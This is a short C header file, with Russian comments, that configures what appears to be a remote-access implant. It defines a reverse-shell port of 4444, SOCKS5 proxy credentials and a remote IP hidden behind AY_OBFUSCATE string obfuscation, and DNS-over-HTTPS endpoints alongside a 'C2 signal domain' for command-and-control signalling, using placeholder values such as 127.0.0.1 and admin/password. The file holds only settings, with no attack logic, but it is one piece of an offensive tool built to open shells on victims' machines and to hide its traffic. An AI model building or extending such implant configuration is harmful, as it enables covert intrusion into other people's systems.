#ifndef CONFIG_H
#define CONFIG_H

// reverse shell 
#define RSHELL_PORT            4444

// SOCKS5 клиента
#define SOCKS_LOGIN            AY_OBFUSCATE("admin")
#define SOCKS_PASSWORD         AY_OBFUSCATE("password")
#define SOCKS_REMOTE_IP        AY_OBFUSCATE("127.0.0.1")
#define SOCKS_REMOTE_PORT      1080

// Количество DOH серверов
#define DOH_COUNT 2

// ANSI DoH эндпоинты
#define DOH_SERVER_0 "cloudflare-dns.com"
#define DOH_SERVER_1 "dns.google"

// Порт для DOH
#define DOH_HTTPS_PORT 443

// Домен для сигнала C2 DOH
#define C2_SIGNAL_DOMAIN "127.0.0.1"

#endif /* CONFIG_H */
